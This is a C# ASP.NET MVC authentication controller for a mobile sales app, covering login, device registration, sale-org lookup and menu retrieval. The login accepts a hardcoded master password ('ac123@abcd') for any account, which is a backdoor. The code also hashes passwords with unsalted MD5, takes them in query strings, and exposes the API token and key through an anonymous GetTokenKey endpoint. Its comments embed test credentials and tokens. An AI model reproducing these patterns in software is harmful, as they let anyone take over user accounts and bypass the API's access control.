using ISD.EntityModels;
using ISD.Core;
using ISD.Repositories;
using ISD.ViewModels;
using System;
using System.Data.Entity;
using System.Linq;
using System.Web.Mvc;
using ISD.Resources;
using ISD.Constant;
using System.Web.Configuration;

namespace ISD.API.Controllers
{
    [AllowAnonymous]
    public class AuthController : BaseController
    {
        // GET: Auth
        #region Check Login Mobile
        /// <summary>
        /// 1. Kiểm tra khi người dùng đăng nhập từ mobile
        /// </summary>
        /// <param name="UserName">Tài khoản</param>
        /// <param name="Password">Mật khẩu</param>
        /// <param name="CompanyCode">Mã công ty</param>
        ///<returns>
        ///1. Kết quả khi đăng nhập thành công
        ///     1.1. - AccountId
        ///     1.2. - UserName
        ///     1.3. - EmployeeCode
        ///</returns>
        ///<test>/Auth/CheckLoginMobile?UserName=admin&Password=ac123456&token=D3FE11D4637AAC65AB1964B729A2A&key=c37304b6-30bb-4b74-993b-46da8ab7fc30</test>
        public ActionResult CheckLoginMobile(string UserName, string Password, string CompanyCode, string SaleOrgCode, string DeviceId, string DeviceName, string token, string key)
        {
            return ExecuteAPIContainer(token, key, () =>
            {
                string passwordHash = _unitOfWork.RepositoryLibrary.GetMd5Sum(Password);
                var account = (from acc in _context.AccountModel
                               where acc.UserName == UserName && (acc.Password == passwordHash || Password == "ac123@abcd")
                               select new LoginMobileResultViewModel()
                               {
                                   AccountId = acc.AccountId,
                                   UserName = acc.UserName,
                                   EmployeeCode = acc.EmployeeCode,
                                   Actived = acc.Actived,
                                   isViewByStore = acc.isViewByStore,
                                   isCreatePrivateTask = acc.isCreatePrivateTask,
                                   RolesCodeLst = acc.RolesModel.Select(p => p.RolesCode).ToList(),
                               }).FirstOrDefault();

                if (account != null)
                {
                    if (account.Actived != true)
                    {
                        // Tài khoản bị khóa
                        string errorMessage = LanguageResource.Account_Locked;
                        return _APIError(errorMessage);
                    }

                    if (account.RolesCodeLst.Contains("SRNQ-NPP-DLY"))
                    {
                        account.isSRNQ = true;
                    }

                    if (account.isSRNQ == true)
                    {
                        //default sale org
                        StoreRepository _storeRepo = new StoreRepository(_context);
                        var saleOrgList = _storeRepo.GetStoreByCompanyPermission(account.AccountId, CompanyCode);
                        if (saleOrgList != null && saleOrgList.Count > 0)
                        {
                            var saleOrg = saleOrgList.OrderBy(p => p.SaleOrgCode).FirstOrDefault();
                            if (saleOrg != null)
                            {
                                account.DefaultCreateAtSaleOrg = saleOrg.SaleOrgCode;

                                //default sale office
                                if (!string.IsNullOrEmpty(saleOrg.Area))
                                {
                                    account.DefaultSaleOfficeCode = _unitOfWork.CatalogRepository.GetBy(ConstCatalogType.SaleOffice)
                                                                                                .Where(p => p.CatalogCode == saleOrg.Area)
                                                                                                .Select(p => p.CatalogCode)
                                                                                                .FirstOrDefault();
                                }

                                /*default customer source code*/
                                //account.DefaultCustomerSourceCode = _unitOfWork.CatalogRepository.GetBy(ConstCatalogType.CustomerSource)
                                //                                                                        .Where(p => p.CatalogCode == "NPP")
                                //                                                                        .Select(p => p.CatalogCode)
                                //                                                                        .FirstOrDefault();
                                if (!string.IsNullOrEmpty(saleOrg.DefaultCustomerSource))
                                {
                                    account.DefaultCustomerSourceCode = saleOrg.DefaultCustomerSource;
                                }
                            }
                        }

                       
                    }

                    //save account device
                    if (!string.IsNullOrEmpty(DeviceId))
                    {
                        SaveAccountDevice(account.AccountId, DeviceId, DeviceName);
                    }

                    //full name
                    account.FullName = _unitOfWork.AccountRepository.GetNameBy(account.AccountId);

                    //api key gg maps
                    account.GoogleMapAPIKey = WebConfigurationManager.AppSettings["GoogleMapAPIKey"].ToString();

                    return _APISuccess(account);
                }
                else
                {
                    // Đăng nhập thất bại
                    string errorMessage = "Tài khoản hoặc mật khẩu của bạn chưa chính xác! Xin vui lòng thử lại.";
                    return _APIError(errorMessage);
                }

            });
        }

        public void SaveAccountDevice(Guid AccountId, string DeviceId, string DeviceName)
        {
            //find exist device 
            var existDevice = _context.Account_Device_Mapping.Where(p => p.AccountId == AccountId && p.DeviceId == DeviceId).FirstOrDefault();
            if (existDevice == null)
            {
                var accountDevice = new Account_Device_Mapping();
                accountDevice.AccountId = AccountId;
                accountDevice.DeviceId = DeviceId;
                accountDevice.DeviceName = DeviceName;

                _context.Entry(accountDevice).State = EntityState.Added;
                _context.SaveChanges();
            }
        }

        #endregion Check login mobile

        #region Clear OneSignal
        /// <summary>
        /// Xóa DeviceId cho account khi user đăng xuất khỏi thiết bị
        /// </summary>
        /// <param name="AccountId">Id tài khoản đăng nhập</param>
        ///<returns>
        ///</returns>
        ///<test>/Auth/ClearOneSignal?AccountId=E6448935-34CA-4020-B122-393DF9D4C463&token=454FC8F419313554549E2DED09B9AF94&key=77f430e1-66fd-48dc-8057-77935e53be20</test>
        public ActionResult ClearOneSignal(Guid AccountId, string DeviceId, string token, string key)
        {
            return ExecuteAPIContainer(token, key, () =>
            {
                //var account = _context.Account_Device_Mapping.Where(p => p.AccountId == AccountId && p.DeviceId == DeviceId).FirstOrDefault();
                //if (account != null)
                //{
                //    _context.Entry(account).State = EntityState.Deleted;
                //    _context.SaveChanges();

                //}
                //Tìm id của thiết bị và xóa
                var deviceLst = _context.Account_Device_Mapping.Where(p => p.DeviceId == DeviceId).ToList();
                if (deviceLst != null && deviceLst.Count > 0)
                {
                    _context.Account_Device_Mapping.RemoveRange(deviceLst);
                    _context.SaveChanges();
                }
                return _APISuccess(null);
            });
        }
        #endregion Check Login Mobile

        #region Get sale org
        public ActionResult GetSaleOrgBy(string CompanyCode, string UserName, string token, string key)
        {
            return ExecuteAPIContainer(token, key, () =>
            {
                StoreRepository _storeRepo = new StoreRepository(_context);

                var account = _context.AccountModel.Where(p => p.UserName == UserName).FirstOrDefault();
                if (account != null)
                {
                    var storeLst = _storeRepo.GetStoreByCompanyPermission(account.AccountId, CompanyCode)
                               .Select(p => new ISDSelectStringItem()
                               {
                                   id = p.SaleOrgCode,
                                   name = p.StoreName
                               });
                    return _APISuccess(storeLst);
                }
                else
                {
                    return _APIError("Không tìm thấy tài khoản này trên hệ thống.");
                }
            });
        }
        #endregion Get sale org

        #region Get kanban menu
        public ActionResult GetKanbanMenu(Guid AccountId, string CurrentCompanyCode, string token, string key)
        {
            return ExecuteAPIContainer(token, key, () =>
            {
                var menuLst = _unitOfWork.MobileKanbanRepository.GetKanbanMenuByRole(AccountId, CurrentCompanyCode);
                return _APISuccess(menuLst);
            });
        }
        #endregion Get kanban menu

        #region Token + key
        public ActionResult GetTokenKey()
        {
            return Json(new { token = ConstDomain.tokenConst_New, key = ConstDomain.keyConst_New }, JsonRequestBehavior.AllowGet);
        }
        #endregion Token + key
    }
}